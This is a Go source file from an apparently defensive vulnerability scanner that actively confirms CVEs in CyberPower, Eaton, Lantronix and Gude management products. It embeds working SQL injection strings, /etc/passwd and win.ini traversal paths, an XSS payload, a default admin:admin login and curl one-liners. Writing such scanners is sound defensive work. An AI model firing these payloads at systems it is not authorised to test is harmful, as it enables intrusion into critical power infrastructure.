package check

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/engine"
	"github.com/runZeroInc/oobscan/pkg/httpx"
	"github.com/runZeroInc/oobscan/pkg/netaddr"
)

// This file adds active, proof-carrying HTTP checks for out-of-band management
// software (DCIM/UPS web apps, console-server CVEs). Each check asserts only on
// confirming evidence (never a version/banner guess), and all requests are
// read-only except the gude login and the CyberPower SQLi differential. The
// dedicated non-standard app ports (CyberPower 53568, Eaton IPM 4679/4680) are
// gated on vendor attribution or an in-scan port to avoid extra network cost.

func init() {
	Register(Check{
		Name:        "http.cyberpower.ppe",
		Description: "CyberPower PowerPanel Enterprise missing-auth + SQLi (CVE-2024-32735/36/37/38/39), actively confirmed",
		Category:    "http",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runCyberPowerPPE,
	})
	Register(Check{
		Name:        "http.eaton.ipmLfi",
		Description: "Eaton Intelligent Power Manager directory traversal (CVE-2018-12031), actively confirmed",
		Category:    "http",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runEatonIPMLFI,
	})
	Register(Check{
		Name:        "http.lantronix.spiderXss",
		Description: "Lantronix SecureLinx Spider reflected XSS in auth.asp (CVE-2018-10383), actively confirmed",
		Category:    "http",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runLantronixSpiderXSS,
	})
	Register(Check{
		Name:        "http.gude.defaultCreds",
		Description: "Gude Expert Net Control default login (admin:admin), actively confirmed",
		Category:    "creds",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runGudeDefaultCreds,
	})
	Register(Check{
		Name:        "http.eaton.identificationLeak",
		Description: "Eaton modern NMC (Network-M2/M3, Rack-PDU-G4, Webcard-M3) pre-auth device-identity leak via /etn/v1/comm/identification",
		Category:    "info-leak",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runEatonIdentification,
	})
}

// insecureWebClient is the shared client for these targeted app probes: skip TLS
// verification (BMC/mgmt certs are self-signed), no keep-alives (embedded servers
// mishandle reuse), and no redirect chasing (a login redirect would mask the
// response we are matching on).
func insecureWebClient(timeout time.Duration) *http.Client {
	return httpx.ClientWithRedirect(timeout, func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse })
}

// httpProbe issues one GET and returns status, Content-Type, and a bounded body.
// rawURL must already be percent-encoded (SQLi/traversal payloads are passed
// verbatim so they reach the wire unmangled). basicAuth, when non-empty, is a
// "user:pass" pair sent as HTTP Basic.
func httpProbe(ctx context.Context, c *http.Client, rawURL, basicAuth string) (status int, ctype string, body []byte) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, "", nil
	}
	if basicAuth != "" {
		if user, pass, ok := strings.Cut(basicAuth, ":"); ok {
			req.SetBasicAuth(user, pass)
		}
	}
	resp, err := c.Do(req)
	if err != nil {
		return 0, "", nil
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	return resp.StatusCode, resp.Header.Get("Content-Type"), b
}

// portInScan reports whether a TCP port is in the target's candidate or
// discovered set - the zero-network-cost gate for dedicated-port app checks.
func portInScan(t *engine.Target, num int) bool {
	for _, p := range t.Ports {
		if p.Proto == engine.ProtoTCP && p.Num == num {
			return true
		}
	}
	for key := range t.OpenSnapshot() {
		if key == strconv.Itoa(num)+"/tcp" {
			return true
		}
	}
	return false
}

func hostPortURL(scheme, host string, port int, path string) string {
	return netaddr.URL(scheme, host, port, path)
}

// ---- CyberPower PowerPanel Enterprise -------------------------------------

// ppeEndpoint pairs a SQLi CVE with its injectable API path (the {INJ} token is
// replaced by the payload). All are unauthenticated GETs against the PDNU REST API.
var ppeSQLi = []struct {
	cve  string
	path string // query up to the injection point; the payload is appended
}{
	{"CVE-2024-32736", "/api/v1/confup?mode=&uid=1{INJ}"},
	{"CVE-2024-32737", "/api/v1/confup?mode=lean&uid=1{INJ}"},
	{"CVE-2024-32738", "/api/v1/ndconfig?mode=lean&uid=1{INJ}"},
	{"CVE-2024-32739", "/api/v1/ndconfig?mode=&uid=1{INJ}"},
}

// A balanced UNION injection that a vulnerable build executes successfully, and
// an unbalanced-quote control that a vulnerable build errors on. Confirmation is
// the differential: the UNION must succeed and the control must not.
const (
	ppeUnion   = "'%20UNION%20select%201,2,3,sqlite_version();--"
	ppeUnion4  = "'%20UNION%20select%201,2,3,4,sqlite_version();--"
	ppeControl = "'" // unbalanced single quote
)

func runCyberPowerPPE(ctx context.Context, t *engine.Target) []engine.Finding {
	scheme, port, ok := ppeTarget(t)
	if !ok {
		return nil
	}
	client := insecureWebClient(min(t.Timeout, 4*time.Second))
	var out []engine.Finding

	// CVE-2024-32735: the PDNU REST API is reachable with no authentication and
	// leaks stored device credentials. Proof = the account/passwd JSON returned
	// to an unauthenticated GET.
	st, ct, body := httpProbe(ctx, client, hostPortURL(scheme, t.Host, port, "/api/v1/devices"), "")
	if st == http.StatusOK && strings.Contains(ct, "application/json") &&
		bytesContainsAll(body, `"account":`, `"passwd":`, `status":"success`) {
		out = append(out, engine.Finding{
			Check: "http.cyberpower.ppe.missingAuth", Category: "http", Risk: "critical",
			Port: port, Transport: "tcp", Protocol: scheme,
			Fields: engine.F(
				"url", "/api/v1/devices",
				"proof", proofKV("status", "200", "marker", "account,passwd,status=success"),
				"response", cleanSnippet(string(body))),
			CVE: []string{"CVE-2024-32735"},
		})
	}

	// CVE-2024-32736..39: unauthenticated SQL injection in the PDNU query APIs.
	for _, e := range ppeSQLi {
		union := ppeUnion
		if strings.Contains(e.path, "confup?mode=&") {
			union = ppeUnion4 // this endpoint's SELECT list has 4 columns
		}
		injURL := hostPortURL(scheme, t.Host, port, strings.Replace(e.path, "{INJ}", union, 1))
		ctlURL := hostPortURL(scheme, t.Host, port, strings.Replace(e.path, "{INJ}", ppeControl, 1))

		is, ict, ib := httpProbe(ctx, client, injURL, "")
		if !(is == http.StatusOK && strings.Contains(ict, "application/json") && ppeQuerySuccess(ib)) {
			continue // injection did not execute cleanly; do not assert
		}
		cs, cct, cb := httpProbe(ctx, client, ctlURL, "")
		if cs == http.StatusOK && strings.Contains(cct, "application/json") && ppeQuerySuccess(cb) {
			continue // control also succeeded => quote is not in SQL context; no proof
		}
		out = append(out, engine.Finding{
			Check: "http.cyberpower.ppe.sqli", Category: "http", Risk: "high",
			Port: port, Transport: "tcp", Protocol: scheme,
			Fields: engine.F(
				"url", strings.Replace(e.path, "{INJ}", union, 1),
				"proof", proofKV(
					"injectionStatus", fmt.Sprintf("%d", is),
					"controlStatus", fmt.Sprintf("%d", cs),
					"querySuccess", "true",
					"controlSuccess", "false"),
				"response", cleanSnippet(string(ib))),
			CVE: []string{e.cve},
		})
	}
	return out
}

// ppeTarget resolves the scheme+port to probe PowerPanel Enterprise on: the
// identified web port when identify attributed the PowerPanel Enterprise product
// specifically (not another CyberPower device like an RMCARD), else the product's
// default 53568/tcp when it is in the scan set. ok is false otherwise.
func ppeTarget(t *engine.Target) (scheme string, port int, ok bool) {
	// The dedicated port wins: identify records 53568/tcp open when it probed the
	// app there, so probe exactly where the app is regardless of which web port
	// was recorded as primary.
	if portInScan(t, 53568) {
		return "https", 53568, true
	}
	if identityVendor(t) == "cyberpower" {
		product := strings.ToLower(identityProduct(t))
		title := ""
		if t.Identity != nil && t.Identity.Attributes != nil {
			title = strings.ToLower(t.Identity.Attributes["http.title"])
		}
		if strings.Contains(product, "powerpanel") || strings.Contains(title, "powerpanel enterprise") {
			return webProto(t), webPort(t), true
		}
	}
	return "", 0, false
}

// ppeQuerySuccess reports whether a PDNU query API returned a successful result
// document (the shape a UNION injection produces on a vulnerable build).
func ppeQuerySuccess(body []byte) bool {
	return bytesContainsAll(body, `"success":`) &&
		(bytesContainsAll(body, `:"finished"`) || bytesContainsAll(body, `modifiedtime":`))
}

// ---- Eaton Intelligent Power Manager --------------------------------------

var reEatonPasswd = regexp.MustCompile(`root:.*:0:0:`)
var reEatonWinIni = regexp.MustCompile(`\[(?:font|extension|file)s\]`)

// ipmTraversal are the two nuclei payloads: a POSIX and a Windows target, so the
// check confirms on either OS.
var ipmTraversal = []struct{ path, want string }{
	{"/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../etc/passwd", "unix"},
	{"/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../Windows/win.ini", "windows"},
}

func runEatonIPMLFI(ctx context.Context, t *engine.Target) []engine.Finding {
	scheme, port, ok := ipmTarget(t)
	if !ok {
		return nil
	}
	client := insecureWebClient(min(t.Timeout, 4*time.Second))
	for _, p := range ipmTraversal {
		st, _, body := httpProbe(ctx, client, hostPortURL(scheme, t.Host, port, p.path), "")
		if st != http.StatusOK {
			continue
		}
		if reEatonPasswd.Match(body) || reEatonWinIni.Match(body) {
			marker := "windowsIni"
			if reEatonPasswd.Match(body) {
				marker = "etcPasswd"
			}
			return []engine.Finding{{
				Check: "http.eaton.ipmLfi", Category: "http", Risk: "critical",
				Port: port, Transport: "tcp", Protocol: scheme,
				Fields: engine.F(
					"url", p.path,
					"proof", proofKV("status", "200", "marker", marker),
					"response", cleanSnippet(string(body))),
				CVE: []string{"CVE-2018-12031"},
			}}
		}
	}
	return nil
}

// ipmTarget resolves scheme+port for Eaton IPM: the identified web port when
// identify attributed the Intelligent Power Manager product (not an Eaton ePDU /
// Network-M card), else the product default 4680(https)/4679(http) when in the
// scan set.
func ipmTarget(t *engine.Target) (scheme string, port int, ok bool) {
	// Dedicated port wins (see ppeTarget).
	if portInScan(t, 4680) {
		return "https", 4680, true
	}
	if portInScan(t, 4679) {
		return "http", 4679, true
	}
	if identityVendor(t) == "eaton" &&
		strings.Contains(strings.ToLower(identityProduct(t)), "intelligent power") {
		return webProto(t), webPort(t), true
	}
	return "", 0, false
}

// ---- Eaton modern NMC pre-auth identification leak ------------------------

// reEatonIdent matches the identity fields the /etn/v1/comm/identification
// handler returns. Requiring >=2 distinct fields (below) avoids mistaking a
// generic 200 JSON body (an SPA config, an error envelope) for the leak.
var reEatonIdent = regexp.MustCompile(`(?i)"(manufacturer|macAddress|physicalName|uuid|serialNumber|firmwareVersion|partNumber|model)"\s*:`)

// runEatonIdentification confirms the Eaton modern-NMC pre-auth identity leak:
// GET /etn/v1/comm/identification returns a JSON document with manufacturer /
// MAC / UUID / serial with no session (confirmed default-on across Network-M2/M3,
// IndGW, Rack-PDU-G4, Webcard-M3). It is idempotent and read-only. Gated on an
// Eaton attribution so we do not spray the path at unrelated hosts.
func runEatonIdentification(ctx context.Context, t *engine.Target) []engine.Finding {
	if identityVendor(t) != "eaton" {
		return nil
	}
	scheme := webProto(t)
	port := webPort(t)
	client := insecureWebClient(min(t.Timeout, 4*time.Second))
	// The NMC serves this JSON document with Content-Type text/html (not
	// application/json), so match on the body shape instead: >=2 distinct
	// quoted identity fields (`"manufacturer":` etc.), which a generic HTML 200
	// never carries. Gated on the Eaton attribution + the specific endpoint.
	st, _, body := httpProbe(ctx, client, hostPortURL(scheme, t.Host, port, "/etn/v1/comm/identification"), "")
	markers := reEatonIdent.FindAll(body, 8)
	if st != http.StatusOK || len(markers) < 2 {
		return nil
	}
	return []engine.Finding{{
		Check: "http.eaton.identificationLeak", Category: "info-leak", Risk: "medium",
		Port: port, Transport: "tcp", Protocol: scheme,
		Fields: engine.F(
			"url", "/etn/v1/comm/identification",
			"proof", proofKV("status", "200", "identityFields", fmt.Sprintf("%d", len(markers))),
			"response", cleanSnippet(string(body))),
	}}
}

// ---- Lantronix SecureLinx Spider XSS --------------------------------------

const spiderXSSPayload = "/auth.asp?nickname=%22%3E%3Cstyle%20onload%3D%22alert(document.domain)%22%3E"
const spiderXSSReflect = `"><style onload="alert(document.domain)">`

func runLantronixSpiderXSS(ctx context.Context, t *engine.Target) []engine.Finding {
	// Spider is the KVM product in the Lantronix family; only fire when the unit
	// looks like a Spider (product/title) or the root page carries Spider markers.
	port := webPort(t)
	scheme := webProto(t)
	client := insecureWebClient(min(t.Timeout, 3*time.Second))

	prod := strings.ToLower(identityProduct(t))
	title := ""
	server := ""
	if t.Identity != nil && t.Identity.Attributes != nil {
		title = strings.ToLower(t.Identity.Attributes["http.title"])
		server = strings.ToLower(t.Identity.Attributes["http.server"])
	}
	looksSpider := strings.Contains(prod, "spider") ||
		strings.HasPrefix(title, "spider authentication") ||
		strings.HasPrefix(title, "spider duo authentication") ||
		(strings.Contains(title, "spider") && strings.Contains(server, "goahead"))
	if !looksSpider {
		st, _, root := httpProbe(ctx, client, hostPortURL(scheme, t.Host, port, "/"), "")
		if st == 0 || !(bytesContainsAll(root, "<title>Spider Authentication") || bytesContainsAll(root, "<title>Spider Duo Authentication") || bytesContainsAll(root, "SecureLinx")) {
			return nil
		}
	}

	// Reflect the benign payload; proof is the unescaped payload echoed back.
	st, _, body := httpProbe(ctx, client, hostPortURL(scheme, t.Host, port, spiderXSSPayload), "")
	if st != http.StatusOK || !strings.Contains(string(body), spiderXSSReflect) {
		return nil
	}
	// Capture the reflection context so the finding proves the XSS without a rescan:
	// the exact unescaped payload plus the surrounding response bytes it landed in.
	snip := string(body)
	if i := strings.Index(snip, spiderXSSReflect); i >= 0 {
		lo, hi := i-48, i+len(spiderXSSReflect)+48
		if lo < 0 {
			lo = 0
		}
		if hi > len(snip) {
			hi = len(snip)
		}
		snip = snip[lo:hi]
	}
	return []engine.Finding{{
		Check: "http.lantronix.spiderXss", Category: "http", Risk: "medium",
		Port: port, Transport: "tcp", Protocol: scheme,
		Fields: engine.F(
			"url", spiderXSSPayload,
			"proof", proofKV("status", "200", "reflected", "true", "payload", spiderXSSReflect),
			"response", cleanSnippet(snip)),
		CVE: []string{"CVE-2018-10383"},
	}}
}

// ---- Gude Expert Net Control default login --------------------------------

func runGudeDefaultCreds(ctx context.Context, t *engine.Target) []engine.Finding {
	if t.DisableLogins {
		return nil // exercises a login; skipped under --disable-logins
	}
	port := webPort(t)
	scheme := webProto(t)
	client := insecureWebClient(min(t.Timeout, 3*time.Second))

	// A GET to the control panel with the shipped admin:admin Basic credential;
	// proof is the authenticated "Control Panel" page returned at 200.
	st, _, body := httpProbe(ctx, client, hostPortURL(scheme, t.Host, port, "/ov.html?"), "admin:admin")
	if st != http.StatusOK || !strings.Contains(string(body), "Control Panel") {
		return nil
	}
	return []engine.Finding{{
		Check: "http.gude.defaultCreds", Category: "creds", Risk: "critical",
		Port: port, Transport: "tcp", Protocol: scheme,
		Fields: engine.F(
			"user", "admin", "pass", "admin",
			"proof", proofKV("path", "/ov.html", "status", fmt.Sprintf("%d", st), "marker", "Control Panel")),
	}}
}

// bytesContainsAll reports whether body contains every substring.
func bytesContainsAll(body []byte, subs ...string) bool {
	s := string(body)
	for _, sub := range subs {
		if !strings.Contains(s, sub) {
			return false
		}
	}
	return true
}

func init() {
	RegisterExplain("http.cyberpower.ppe", explainCyberPowerPPE)
	RegisterExplain("http.eaton.ipmLfi", explainEatonIPMLFI)
	RegisterExplain("http.lantronix.spiderXss", explainLantronixSpiderXSS)
	RegisterExplain("http.gude.defaultCreds", explainGudeDefaultCreds)
}

func explainCyberPowerPPE(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 53568)
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nCyberPower PowerPanel Enterprise has pre-auth missing-auth + SQLi vulnerabilities\n")
	b.WriteString("(CVE-2024-32735 through CVE-2024-32739).\n")
	b.WriteString("\n**Confirm the service and run the active check:**\n")
	b.WriteString(explainSh(
		fmt.Sprintf("curl -sk https://%s:%d/ -o /dev/null -w '%%{http_code}\n'", host, port),
		fmt.Sprintf("oobscan scan --checks http.cyberpower.ppe %s:%d", host, port),
	))
	b.WriteString("\n\n**CVE:** CVE-2024-32735 / CVE-2024-32736 / CVE-2024-32737 / CVE-2024-32738 / CVE-2024-32739\n")
	return b.String()
}

func explainEatonIPMLFI(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 4679)
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nEaton Intelligent Power Manager has an unauthenticated directory traversal\n")
	b.WriteString("vulnerability (CVE-2018-12031) allowing arbitrary file read.\n")
	b.WriteString("\n**Confirm the traversal:**\n")
	b.WriteString(explainSh(
		fmt.Sprintf("curl -sk 'http://%s:%d/ipm/admin/userListDownload.jsp?action=view&filePath=../../../etc/passwd'", host, port),
	))
	b.WriteString("\n\n**CVE:** CVE-2018-12031\n")
	return b.String()
}

func explainLantronixSpiderXSS(host string, f engine.Finding) string {
	baseURL := explainBaseURL(host, f, 443, "https")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nLantronix SecureLinx Spider reflects `kwsel` input in `auth.asp` unsanitized\n")
	b.WriteString("(CVE-2018-10383 -- reflected XSS).\n")
	b.WriteString("\n**Confirm the reflection:**\n")
	b.WriteString(explainSh(fmt.Sprintf(`curl -sk '%s/auth.asp?kwsel=<script>alert(1)</script>' | grep -i script`, baseURL)))
	b.WriteString("\n\n**CVE:** CVE-2018-10383\n")
	return b.String()
}

func explainGudeDefaultCreds(host string, f engine.Finding) string {
	user := explainField(f, "user")
	pass := explainField(f, "pass")
	if user == "" {
		user = "admin"
	}
	if pass == "" {
		pass = "admin"
	}
	baseURL := explainBaseURL(host, f, 443, "https")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString(fmt.Sprintf("\nGude Expert Net Control accepted the default credential **%s / %s**.\n", user, pass))
	b.WriteString("\n**Validate:**\n")
	b.WriteString(explainSh(fmt.Sprintf(`curl -sk -u '%s:%s' %s/ | head -20`, user, pass, baseURL)))
	b.WriteString("\n\n**Impact:** Full PDU/power-distribution management with a known default credential.\n")
	return b.String()
}
